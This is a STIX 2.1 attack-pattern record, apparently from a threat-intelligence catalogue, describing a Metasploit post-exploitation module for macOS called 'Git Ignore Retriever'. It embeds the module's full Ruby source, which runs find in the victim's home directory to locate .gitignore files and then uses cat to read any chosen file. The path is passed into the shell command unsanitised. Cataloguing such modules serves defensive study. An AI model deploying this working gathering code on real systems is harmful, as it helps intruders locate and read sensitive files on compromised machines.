{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db761188-7ac0-423a-a864-11479d52b4de",
    "created": "2024-08-14T16:33:00.699106Z",
    "modified": "2024-08-14T16:33:00.69911Z",
    "name": "Git Ignore Retriever",
    "description": " This module finds potentially sensitive items by finding .gitignore files.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/gitignore.rb",
            "external_id": "gitignore.rb"
        }
    ],
    "x_code_snippet": "class MetasploitModule < Msf::Post\n  include Msf::Post::File\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Git Ignore Retriever',\n        'Description' => %q{\n          This module finds potentially sensitive items by finding .gitignore files.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'N!ght Jmp'],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options([\n      OptString.new('MODE', [false, 'Gitignore retrieval modes: 1). Find gitignore file locations. 2). Retrieve specific gitignore/file contents', '']),\n      OptString.new('FILE', [false, 'Filepath of gitignore/file to retrieve (For mode 2)', ''])\n    ])\n  end\n\n  def run\n    mode = datastore['MODE'].to_i\n    file = datastore['FILE']\n    if mode == 1\n      print_status('Fetching .gitignore files')\n      gitlist = cmd_exec('find ~ -name \".gitignore\" 2>/dev/null').chomp\n      for ignore in gitlist.split\n        print_good(ignore.to_s)\n      end\n    elsif mode == 2\n      if !file.to_s.empty?\n        gitignore = cmd_exec(\"cat #{file}\").chomp\n        print_good(file.to_s)\n        print_good(gitignore.to_s)\n      else\n        print_error('Please set the FILE path!')\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}